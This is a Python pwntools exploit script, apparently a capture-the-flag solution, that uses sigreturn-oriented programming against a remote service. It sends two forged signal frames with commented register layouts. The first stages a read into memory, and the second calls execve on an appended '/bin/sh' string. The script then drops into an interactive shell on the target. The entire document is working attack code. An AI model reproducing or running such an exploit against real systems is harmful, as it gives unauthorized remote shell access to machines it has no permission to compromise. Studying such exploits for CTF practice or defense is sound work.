from pwn import *

HOST = "163.172.176.29"
PORT = 9034
conn = remote(HOST, PORT)
#conn = process("./player_bin")
payload = ""
#uc_flags      <- rsp
#&uc_link
#&ss_sp        (stack_t)
#ss_flags         |
#ss_size          v
#r8            (struct sigcontext)
#r9               |
#r10              |
#r11              |
#r12              |
#r13              |
#r14              |
#r15              |
payload += p64(0) * 13
#rdi              |
payload += p64(0)
#rsi              |
payload += p64(0x10000800)
#rbp              |
#rbx              |
payload += p64(0) * 2
#rdx              |
payload += p64(0x1000)
#rax              |
payload += p64(0)
#rcx              |
payload += p64(0)
#rsp              |
payload += p64(0x10000800)
#rip              |
payload += p64(0x1000000b)
#eflags           |
payload += p64(0)
#cs/gs/fs         |
payload += p64(0x33)
#err              |
#trapno           |
#oldmask          |
#cr2              |
#&fpstate         |
#reserved1[0]     |
#reserved1[1]     |
#reserved1[2]     |
#reserved1[3]     |
#reserved1[4]     |
#reserved1[5]     |
#reserved1[6]     |
#reserved1[7]     v
#uc_sigmask    (sigset_t)
payload += p64(0) * 14
conn.send(payload)
struct_size = len(payload)
payload = ""
#uc_flags      <- rsp
#&uc_link
#&ss_sp        (stack_t)
#ss_flags         |
#ss_size          v
#r8            (struct sigcontext)
#r9               |
#r10              |
#r11              |
#r12              |
#r13              |
#r14              |
#r15              |
payload += p64(0) * 13
#rdi              |
payload += p64(0x10000800 + struct_size)
#rsi              |
payload += p64(0)
#rbp              |
#rbx              |
payload += p64(0) * 2
#rdx              |
payload += p64(0)
#rax              |
payload += p64(59)
#rcx              |
payload += p64(0)
#rsp              |
payload += p64(0x10000800)
#rip              |
payload += p64(0x10000015)
#eflags           |
payload += p64(0)
#cs/gs/fs         |
payload += p64(0x33)
#err              |
#trapno           |
#oldmask          |
#cr2              |
#&fpstate         |
#reserved1[0]     |
#reserved1[1]     |
#reserved1[2]     |
#reserved1[3]     |
#reserved1[4]     |
#reserved1[5]     |
#reserved1[6]     |
#reserved1[7]     v
#uc_sigmask    (sigset_t)
payload += p64(0) * 14
payload += "/bin/sh\x00"
conn.send(payload)
conn.interactive()
